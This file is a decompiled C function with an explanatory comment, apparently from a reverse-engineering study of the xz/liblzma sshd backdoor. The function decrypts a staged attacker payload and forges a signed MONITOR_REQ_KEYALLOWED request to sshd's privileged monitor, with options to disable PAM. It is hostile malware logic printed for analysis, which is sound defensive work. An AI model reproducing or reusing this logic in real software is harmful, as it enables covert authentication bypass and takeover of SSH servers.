// /home/kali/xzre-ghidra/xzregh/108270_sshd_proxy_elevate.c
// Function: sshd_proxy_elevate @ 0x108270
// Calling convention: unknown
// Prototype: undefined sshd_proxy_elevate(void)


/*
 * AutoDoc: Implements the privileged side of the monitor command channel. Depending on the cmd_type and
 * flags it may disable PAM, short-circuit non interactive requests, or exit when instructed. For
 * KEYALLOWED-style payloads it hunts for the staged ChaCha-wrapped blob on the stack, decrypts
 * it with the recovered key, generates a signed MONITOR_REQ_KEYALLOWED packet using freshly
 * built RSA/BIGNUM objects and the attacker-provided modulus/exponent, and writes the forged
 * request over the selected monitor or fallback socket. It then pushes any extra sshbuf data
 * when needed, drains the reply, and honours 'exit' or 'wait for response' semantics encoded in
 * the original command.
 */
#include "xzre_types.h"


undefined8 sshd_proxy_elevate(uint *param_1,long param_2)

{
  int *piVar1;
  char cVar2;
  char cVar3;
  long *plVar4;
  code *pcVar5;
  int iVar6;
  int iVar7;
  uint uVar8;
  byte *pbVar9;
  long *plVar10;
  int *piVar11;
  long lVar12;
  undefined8 uVar13;
  long lVar14;
  long lVar15;
  long lVar16;
  byte extraout_DL;
  uint uVar17;
  byte bVar18;
  undefined8 *puVar19;
  ulong uVar20;
  uint *puVar21;
  ulong *puVar22;
  undefined8 *puVar23;
  uint *puVar24;
  uchar *puVar25;
  uint *puVar26;
  ulong *puVar27;
  undefined4 *puVar28;
  ulong uVar29;
  long *plVar30;
  long lVar31;
  byte bVar32;
  undefined1 local_e81;
  int monitor_fd;
  int local_e7c;
  ulong local_e78;
  long local_e70 [6];
  undefined8 local_e40;
  undefined8 uStack_e38;
  undefined4 local_e30 [57];
  undefined1 local_d4a;
  undefined1 local_d41;
  ulong local_d40 [2];
  undefined4 local_d30 [60];
  undefined8 local_c40;
  undefined8 local_c38;
  undefined4 local_c30;
  undefined4 local_c2c;
  ulong local_c28 [33];
  uint local_b20 [2];
  undefined1 uStack_b18;
  undefined7 uStack_b17;
  uchar payload_hash [32];
  undefined4 local_abb [66];
  undefined4 local_9b3;
  uint local_98b;
  undefined4 local_987;
  undefined3 local_983;
  undefined1 uStack_980;
  undefined3 uStack_97f;
  uint local_920 [5];
  undefined1 local_90b [399];
  undefined4 local_77c [467];
  
  bVar32 = 0;
  local_920[0] = 0;
  local_920[1] = 0;
  local_920[2] = 0;
  local_920[3] = 0;
  puVar24 = local_920 + 4;
  for (lVar14 = 0x236; lVar14 != 0; lVar14 = lVar14 + -1) {
    *puVar24 = 0;
    puVar24 = puVar24 + 1;
  }
  monitor_fd = -1;
  if (param_1 == (uint *)0x0) {
    return 0;
  }
  lVar14 = *(long *)(param_1 + 4);
  if (lVar14 == 0) {
    return 0;
  }
  lVar16 = *(long *)(param_1 + 6);
  if (lVar16 == 0) {
    return 0;
  }
  uVar8 = *param_1;
  if ((uVar8 == 3) && ((*(byte *)(*(long *)(param_1 + 2) + 1) & 0x40) == 0)) {
    if (*(long *)(param_1 + 0xc) == 0) {
      return 0;
    }
    if (*(long *)(param_1 + 8) == 0) {
      return 0;
    }
    if ((short)param_1[10] != 0x30) {
      return 0;
    }
  }
  if (param_2 == 0) {
    return 0;
  }
  lVar12 = *(long *)(param_2 + 8);
  if (lVar12 == 0) {
    return 0;
  }
  lVar15 = *(long *)(param_2 + 0x10);
  if (lVar15 == 0) {
    return 0;
  }
  if (*(long *)(lVar15 + 0x40) == 0) {
    return 0;
  }
  if (*(long *)(lVar15 + 0x50) == 0) {
    return 0;
  }
  piVar11 = *(int **)(param_2 + 0x20);
  if (*piVar11 == 0) {
    if (uVar8 == 0) {
      return 0;
    }
    pbVar9 = *(byte **)(param_1 + 2);
    if (uVar8 == 3) {
      if ((pbVar9[2] & 0x20) != 0) {
        return 0;
      }
      uVar17 = 0x16;
      if (*(long *)(piVar11 + 0x16) != 0) {
        uVar17 = *(uint *)(*(long *)(piVar11 + 0x16) + -8);
      }
LAB_0010844c:
      bVar18 = pbVar9[3];
      goto LAB_00108450;
    }
    if (pbVar9 == (byte *)0x0) {
      uVar17 = 0x16;
      if (uVar8 != 1) goto LAB_0010845f;
    }
    else {
      if (uVar8 != 1) {
        if (uVar8 != 2) {
LAB_001083b5:
          uVar17 = 0x16;
          if (*(long *)(piVar11 + 0x16) != 0) {
            uVar17 = *(uint *)(*(long *)(piVar11 + 0x16) + -8);
          }
          goto LAB_00108447;
        }
LAB_001083ef:
        uVar17 = (uint)pbVar9[2];
        if (pbVar9[2] == 0) {
          uVar17 = 0x16;
          if (*(long *)(piVar11 + 0x16) != 0) {
            uVar17 = *(uint *)(*(long *)(piVar11 + 0x16) + -8);
          }
        }
        goto LAB_0010845f;
      }
LAB_001083d7:
      uVar17 = (uint)pbVar9[2];
      if (pbVar9[2] == 0) {
        if (*(long *)(piVar11 + 0x16) == 0) {
          uVar17 = 0x16;
        }
        else {
          uVar17 = *(uint *)(*(long *)(piVar11 + 0x16) + -8);
        }
      }
    }
LAB_0010843f:
    if ((pbVar9[1] & 1) != 0) goto LAB_0010845f;
  }
  else {
    pbVar9 = *(byte **)(param_1 + 2);
    if (pbVar9 == (byte *)0x0) {
      uVar17 = 0x16;
      if (uVar8 != 0) {
        if (uVar8 == 1) goto LAB_0010843f;
LAB_00108447:
        if (uVar8 != 3) goto LAB_0010845f;
        goto LAB_0010844c;
      }
    }
    else {
      if (uVar8 == 1) goto LAB_001083d7;
      if (uVar8 == 2) goto LAB_001083ef;
      if (uVar8 != 0) goto LAB_001083b5;
      if ((pbVar9[2] & 0x3f) == 0) {
        if (*(long *)(piVar11 + 0x16) == 0) {
          uVar17 = 0x16;
        }
        else {
          uVar17 = *(uint *)(*(long *)(piVar11 + 0x16) + -8);
        }
      }
      else {
        uVar17 = (uint)(pbVar9[2] & 0x3f) * 2;
      }
    }
    bVar18 = pbVar9[1];
LAB_00108450:
    if ((char)bVar18 < '\0') goto LAB_0010845f;
  }
  **(undefined4 **)(piVar11 + 0x32) = 3;
LAB_0010845f:
  if ((*param_1 < 2) || (*param_1 == 3)) {
    if ((*pbVar9 & 0x40) != 0) {
      piVar1 = piVar11 + 0x30;
      if (*(undefined4 **)piVar1 == (undefined4 *)0x0) {
        return 0;
      }
      piVar11 = (int *)0x0;
      **(undefined4 **)piVar1 = 0;
    }
    if ((*param_1 == 3) && ((pbVar9[1] & 0xc0) != 0xc0)) {
      if ((pbVar9[1] & 0xc0) == 0x40) {
        if (*(code **)(lVar15 + 0x18) == (code *)0x0) {
          return 0;
        }
        (**(code **)(lVar15 + 0x18))(0,piVar11,uVar17);
        return 0;
      }
      if ((ushort)param_1[10] < 0x30) {
        return 0;
      }
      plVar4 = *(long **)(param_1 + 8);
      lVar14 = *plVar4;
      lVar16 = plVar4[1];
      if (0x3fef < lVar16 - 0x11U) {
        return 0;
      }
      puVar27 = *(ulong **)(lVar15 + 0x68);
      puVar22 = (ulong *)register0x00000020;
      do {
        if (puVar27 <= puVar22) {
          return 0;
        }
        plVar30 = (long *)*puVar22;
        if ((long *)0xffffff < plVar30) {
          iVar7 = is_range_mapped(plVar30,0x4001 - lVar16,param_2);
          if (iVar7 != 0) {
            plVar10 = (long *)((0x4001 - lVar16) + (long)plVar30);
            for (; plVar30 < plVar10; plVar30 = (long *)((long)plVar30 + 1)) {
              local_b20[0] = 0;
              local_b20[1] = 0;
              uStack_b18 = 0;
              uStack_b17 = 0;
              payload_hash[0] = '\0';
              payload_hash[1] = '\0';
              payload_hash[2] = '\0';
              payload_hash[3] = '\0';
              payload_hash[4] = '\0';
              payload_hash[5] = '\0';
              payload_hash[6] = '\0';
              payload_hash[7] = '\0';
              payload_hash[8] = '\0';
              payload_hash[9] = '\0';
              payload_hash[10] = '\0';
              payload_hash[0xb] = '\0';
              payload_hash[0xc] = '\0';
              payload_hash[0xd] = '\0';
              payload_hash[0xe] = '\0';
              payload_hash[0xf] = '\0';
              if ((*plVar30 == lVar14) &&
                 (iVar7 = sha256(plVar30,lVar16,local_b20,0x20,*(undefined8 *)(param_2 + 8)),
                 iVar7 != 0)) {
                lVar12 = 0;
                while( TRUE ) {
                  cVar2 = *(char *)((long)plVar4 + lVar12 + 0x10);
                  cVar3 = *(char *)((long)local_b20 + lVar12);
                  if ((cVar2 < cVar3) || (cVar3 < cVar2)) break;
                  lVar12 = lVar12 + 1;
                  if (lVar12 == 0x20) {
                    local_b20[0] = 0;
                    local_b20[1] = 0;
                    uStack_b18 = 0;
                    uStack_b17 = 0;
                    puVar25 = payload_hash;
                    for (lVar14 = 0x29; lVar14 != 0; lVar14 = lVar14 + -1) {
                      *puVar25 = '\0';
                      puVar25 = puVar25 + (ulong)bVar32 * -2 + 1;
                    }
                    iVar7 = secret_data_get_decrypted(local_b20,param_2);
                    if (iVar7 == 0) {
                      return 0;
                    }
                    uVar20 = lVar16 - 0x10;
                    puVar24 = (uint *)(plVar30 + 2);
                    iVar7 = chacha_decrypt(puVar24,uVar20 & 0xffffffff,local_b20,plVar30,puVar24,
                                           *(undefined8 *)(param_2 + 8));
                    if (iVar7 == 0) {
                      return 0;
                    }
                    goto LAB_00108861;
                  }
                }
              }
            }
          }
        }
        puVar22 = puVar22 + 1;
      } while( TRUE );
    }
  }
  puVar23 = *(undefined8 **)(param_2 + 0x38);
  local_d40[0] = 0;
  local_d40[1] = 0;
  puVar24 = local_b20;
  for (lVar15 = 0x69; lVar15 != 0; lVar15 = lVar15 + -1) {
    *puVar24 = 0;
    puVar24 = puVar24 + 1;
  }
  local_e81 = 1;
  puVar19 = &local_c40;
  for (lVar15 = 0x47; lVar15 != 0; lVar15 = lVar15 + -1) {
    *(undefined4 *)puVar19 = 0;
    puVar19 = (undefined8 *)((long)puVar19 + 4);
  }
  local_e7c = 0;
  puVar28 = local_e30;
  for (lVar15 = 0x3c; lVar15 != 0; lVar15 = lVar15 + -1) {
    *puVar28 = 0;
    puVar28 = puVar28 + 1;
  }
  local_e70[2] = 0;
  local_e70[3] = 0;
  puVar28 = local_d30;
  for (lVar15 = 0x3c; lVar15 != 0; lVar15 = lVar15 + -1) {
    *puVar28 = 0;
    puVar28 = puVar28 + 1;
  }
  local_e70[4] = 0;
  local_e70[5] = 0;
  local_e40 = 0;
  uStack_e38 = 0;
  if (((puVar23 != (undefined8 *)0x0) && (*(long *)(param_2 + 0x40) != 0)) &&
     (iVar7 = contains_null_pointers(lVar12 + 0xd0,9), iVar7 == 0)) {
    puVar24 = local_920;
    lVar31 = 0;
    uVar29 = 0;
    local_b20[1] = (uint)extraout_DL;
    uStack_b18 = 2;
    puVar21 = puVar24;
    for (lVar15 = 0x23a; lVar15 != 0; lVar15 = lVar15 + -1) {
      *puVar21 = 0;
      puVar21 = puVar21 + (ulong)bVar32 * -2 + 1;
    }
    payload_hash[5] = '\0';
    payload_hash[6] = '\0';
    payload_hash[7] = '\0';
    payload_hash[8] = '\x1c';
    local_e70[0] = lVar16;
    local_e40 = CONCAT71(local_e40._1_7_,0x80);
    local_e70[1] = lVar14;
    payload_hash._9_7_ = (undefined7)*puVar23;
    payload_hash[0x10] = (uchar)((ulong)*puVar23 >> 0x38);
    payload_hash._17_4_ = (undefined4)puVar23[1];
    local_d4a = 8;
    local_d41 = 1;
    payload_hash._21_4_ = (undefined4)*(undefined8 *)((long)puVar23 + 0xc);
    payload_hash._25_4_ = (undefined4)((ulong)*(undefined8 *)((long)puVar23 + 0xc) >> 0x20);
    stack0xfffffffffffff50d = *(undefined8 *)((long)puVar23 + 0x14);
    puVar19 = &local_e40;
    puVar28 = local_abb;
    for (lVar14 = 0x40; lVar14 != 0; lVar14 = lVar14 + -1) {
      *puVar28 = *(undefined4 *)puVar19;
      puVar19 = (undefined8 *)((long)puVar19 + (ulong)bVar32 * -8 + 4);
      puVar28 = puVar28 + (ulong)bVar32 * -2 + 1;
    }
    uVar20 = 0x628;
    local_9b3 = 0x1000000;
    local_987 = 0x7000000;
    local_983 = (undefined3)*(undefined4 *)puVar23;
    uStack_980 = (undefined1)*(undefined4 *)((long)puVar23 + 3);
    uStack_97f = (undefined3)((uint)*(undefined4 *)((long)puVar23 + 3) >> 8);
    while( TRUE ) {
      local_e78 = 0;
      iVar7 = bignum_serialize((long)local_77c + uVar29,uVar20,&local_e78,local_e70[lVar31],lVar12);
      if ((iVar7 == 0) || (uVar20 < local_e78)) break;
      uVar29 = uVar29 + local_e78;
      uVar20 = uVar20 - local_e78;
      if (lVar31 != 0) {
        if (0x628 < uVar29) {
          return 0;
        }
        iVar7 = (int)uVar29;
        uVar8 = iVar7 + 0xb;
        local_98b = uVar8 >> 0x18 | (uVar8 & 0xff0000) >> 8 | (uVar8 & 0xff00) << 8 |
                    uVar8 * 0x1000000;
        uVar8 = iVar7 + 0x2a7;
        payload_hash._1_4_ =
             uVar8 >> 0x18 | (uVar8 & 0xff0000) >> 8 | (uVar8 & 0xff00) << 8 | uVar8 * 0x1000000;
        uVar8 = iVar7 + 700;
        local_b20[0] = uVar8 >> 0x18 | (uVar8 & 0xff0000) >> 8 | (uVar8 & 0xff00) << 8 |
                       uVar8 * 0x1000000;
        lVar14 = *(long *)(param_2 + 8);
        puVar21 = local_b20;
        puVar26 = puVar24;
        for (lVar16 = 0x69; lVar16 != 0; lVar16 = lVar16 + -1) {
          *puVar26 = *puVar21;
          puVar21 = puVar21 + (ulong)bVar32 * -2 + 1;
          puVar26 = puVar26 + (ulong)bVar32 * -2 + 1;
        }
        lVar14 = (**(code **)(lVar14 + 0xd0))();
        if (lVar14 == 0) {
          return 0;
        }
        lVar16 = (**(code **)(*(long *)(param_2 + 8) + 0xe0))(&local_e81,1,0);
        if (lVar16 != 0) {
          lVar12 = (**(code **)(*(long *)(param_2 + 8) + 0xe0))(&local_e40,0x100,0);
          lVar15 = (**(code **)(*(long *)(param_2 + 8) + 0xe0))(&local_e81,1,0);
          iVar7 = (**(code **)(*(long *)(param_2 + 8) + 0xe8))(lVar14,lVar12,lVar16,lVar15);
          if (iVar7 != 1) goto LAB_00108cd2;
          pcVar5 = *(code **)(*(long *)(param_2 + 8) + 0xf0);
          uVar13 = (**(code **)(*(long *)(param_2 + 8) + 0x58))();
          iVar7 = (*pcVar5)(local_90b,uVar29 + 399,local_e70 + 2,0,uVar13,0);
          if (iVar7 == 1) {
            iVar7 = (**(code **)(*(long *)(param_2 + 8) + 0xf8))
                              (0x2a0,local_e70 + 2,0x20,local_d40,&local_e7c,lVar14);
            if ((iVar7 == 1) && (local_e7c == 0x100)) {
              local_c40 = 0xc00000014010000;
              local_c2c = 0x10000;
              local_c38 = **(undefined8 **)(param_2 + 0x40);
              local_c30 = *(undefined4 *)(*(undefined8 **)(param_2 + 0x40) + 1);
              uVar20 = uVar29 + 0x2c0;
              puVar22 = local_d40;
              puVar27 = local_c28;
              for (lVar16 = 0x40; lVar16 != 0; lVar16 = lVar16 + -1) {
                *(int *)puVar27 = (int)*puVar22;
                puVar22 = (ulong *)((long)puVar22 + (ulong)bVar32 * -8 + 4);
                puVar27 = (ulong *)((long)puVar27 + (ulong)bVar32 * -8 + 4);
              }
              lVar16 = *(long *)(param_2 + 8);
              puVar23 = &local_c40;
              puVar28 = (undefined4 *)((long)local_77c + uVar29);
              for (lVar12 = 0x47; lVar12 != 0; lVar12 = lVar12 + -1) {
                *puVar28 = *(undefined4 *)puVar23;
                puVar23 = (undefined8 *)((long)puVar23 + (ulong)bVar32 * -8 + 4);
                puVar28 = puVar28 + (ulong)bVar32 * -2 + 1;
              }
              (**(code **)(lVar16 + 0x108))(lVar14);
LAB_00108861:
              pbVar9 = *(byte **)(param_1 + 2);
              uVar8 = *param_1;
              if (pbVar9 == (byte *)0x0) {
                return 0;
              }
              if ((*pbVar9 & 0x20) == 0) {
                iVar7 = sshd_get_client_socket(param_2,&monitor_fd,1,0);
              }
              else {
                if (uVar8 == 2) {
                  bVar18 = pbVar9[1] >> 1;
                }
                else if (uVar8 < 3) {
                  if (uVar8 == 0) {
                    bVar18 = pbVar9[1] >> 3 & 0xf;
                  }
                  else {
                    bVar18 = pbVar9[1] >> 2;
                  }
                }
                else {
                  bVar18 = 1;
                  if (uVar8 == 3) {
                    bVar18 = pbVar9[2] & 0x1f;
                  }
                }
                iVar7 = sshd_get_usable_socket(&monitor_fd,bVar18,*(undefined8 *)(param_2 + 0x10));
              }
              iVar6 = monitor_fd;
              if (iVar7 == 0) {
                return 0;
              }
              pbVar9 = *(byte **)(param_1 + 2);
              uVar8 = *param_1;
              lVar14 = *(long *)(param_2 + 0x10);
              puVar23 = &local_c40;
              for (lVar16 = 0x12; lVar16 != 0; lVar16 = lVar16 + -1) {
                *(undefined4 *)puVar23 = 0;
                puVar23 = (undefined8 *)((long)puVar23 + (ulong)bVar32 * -8 + 4);
              }
              if (monitor_fd < 0) {
                return 0;
              }
              if (pbVar9 == (byte *)0x0) {
                return 0;
              }
              if (lVar14 == 0) {
                return 0;
              }
              if (*(long *)(lVar14 + 0x18) == 0) {
                return 0;
              }
              if ((uVar8 == 0) || ((uVar8 == 3 && ((pbVar9[2] & 0x20) != 0)))) {
                iVar7 = sshd_get_sshbuf(&local_c40,param_2);
                if (iVar7 == 0) {
                  return 0;
                }
                *(uint *)(param_2 + 0x50) = *pbVar9 & 1;
              }
              lVar16 = fd_write(iVar6,puVar24,uVar20,lVar14);
              if (lVar16 < 0) {
                return 0;
              }
              if (uVar8 == 0) {
LAB_001089b5:
                local_b20[1] = local_b20[1] & 0xffffff00;
                uVar20 = local_c28[0];
                if (0x40 < local_c28[0]) {
                  uVar20 = 0x40;
                }
                uVar17 = (int)uVar20 + 1;
                local_b20[0] = uVar17 >> 0x18 | (uVar17 & 0xff0000) >> 8 | (uVar17 & 0xff00) << 8 |
                               uVar17 * 0x1000000;
                lVar16 = fd_write(iVar6,local_b20,5,lVar14);
                if (lVar16 < 0) {
                  return 0;
                }
                lVar16 = fd_write(iVar6,local_c40,uVar20,lVar14);
                if (lVar16 < 0) {
                  return 0;
                }
                if (uVar8 != 3) goto LAB_0010897e;
              }
              else {
                if (uVar8 != 3) goto LAB_0010897e;
                if ((pbVar9[2] & 0x20) != 0) goto LAB_001089b5;
              }
              if (-1 < (char)*pbVar9) {
                return 1;
              }
LAB_0010897e:
              local_d40[0] = local_d40[0] & 0xffffffff00000000;
              lVar16 = fd_read(iVar6,local_d40,4,lVar14);
              if (lVar16 < 0) {
                return 0;
              }
              uVar17 = (uint)local_d40[0] >> 0x18 | ((uint)local_d40[0] & 0xff0000) >> 8 |
                       ((uint)local_d40[0] & 0xff00) << 8 | (uint)local_d40[0] << 0x18;
              local_d40[0] = CONCAT44(local_d40[0]._4_4_,uVar17);
              uVar20 = (ulong)uVar17;
              if (uVar20 != 0) {
                if (*(long *)(lVar14 + 0x48) == 0) {
                  return 0;
                }
                if (*(long *)(lVar14 + 0x50) == 0) {
                  return 0;
                }
                do {
                  while( TRUE ) {
                    uVar29 = 0x200;
                    if (uVar20 < 0x201) {
                      uVar29 = uVar20;
                    }
                    lVar16 = (**(code **)(lVar14 + 0x48))(iVar6,local_b20,uVar29);
                    if (-1 < lVar16) break;
                    piVar11 = (int *)(**(code **)(lVar14 + 0x50))();
                    if (*piVar11 != 4) {
                      return 0;
                    }
                  }
                  if (lVar16 == 0) {
                    return 0;
                  }
                  uVar20 = uVar20 - lVar16;
                } while (uVar20 != 0);
              }
              if (uVar8 != 2) {
                return 1;
              }
              if (*(code **)(lVar14 + 0x18) == (code *)0x0) {
                return 0;
              }
              (**(code **)(lVar14 + 0x18))(0);
              return 1;
            }
          }
        }
        lVar12 = 0;
        lVar16 = 0;
        lVar15 = 0;
LAB_00108cd2:
        (**(code **)(*(long *)(param_2 + 8) + 0x108))(lVar14);
        if (lVar16 != 0) {
          (**(code **)(*(long *)(param_2 + 8) + 0x110))(lVar16);
        }
        if (lVar12 != 0) {
          (**(code **)(*(long *)(param_2 + 8) + 0x110))(lVar12);
        }
        if (lVar15 == 0) {
          return 0;
        }
        (**(code **)(*(long *)(param_2 + 8) + 0x110))(lVar15);
        return 0;
      }
      lVar31 = 1;
    }
  }
  return 0;
}

